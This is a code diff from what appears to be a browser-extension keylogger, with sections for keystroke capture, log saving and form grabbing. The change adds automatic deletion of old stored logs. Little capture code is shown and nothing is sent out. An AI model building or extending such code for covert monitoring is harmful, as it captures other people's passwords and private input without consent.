@@ -3,6 +3,7 @@ if (!document.title) {
     document.title = document.URL;
 }
 
+
 /* Keylib */
 // Alphanumeric
 document.addEventListener('keypress', function (e) {
@@ -54,6 +55,7 @@ chrome.storage.sync.get({allKeys: false}, function(settings) {
     }
 });
 
+
 /* Keylog Saving */
 var time = new Date().getTime();
 var data = {};
@@ -71,6 +73,7 @@ function log(input) {
     console.log("Logged", input);
 }
 
+
 /* Save data */
 function save() {
     if (shouldSave) {
@@ -78,15 +81,35 @@ function save() {
     }
 }
 
+function autoDelete() {
+    chrome.storage.sync.get({autoDelete: 1337}, function(settings) {
+        // Make sure to sync with delete code from viewer.js
+        var endDate = (new Date()).getTime() - (settings.autoDelete * 24 * 60 * 60 * 1000);
+        chrome.storage.local.get(function(logs) {
+            var toDelete = [];
+            for (var key in logs) {
+                if (key < endDate || isNaN(key) || key < 10000) { // Restrict by time and remove invalid chars 
+                  toDelete.push(key);
+                }
+            }
+            chrome.storage.local.remove(toDelete, function() {
+                console.log(toDelete.length + " entries deleted");
+            });
+        });
+    });
+}
+
 // Save data on window close
 window.onbeforeunload = function() {
     save();
+    autoDelete();
 }
 
 // Save every second
 setInterval(function(){
     save();
 }, 1000);
+
 
 /* Form Grabber */
 function saveForm(time, data) {
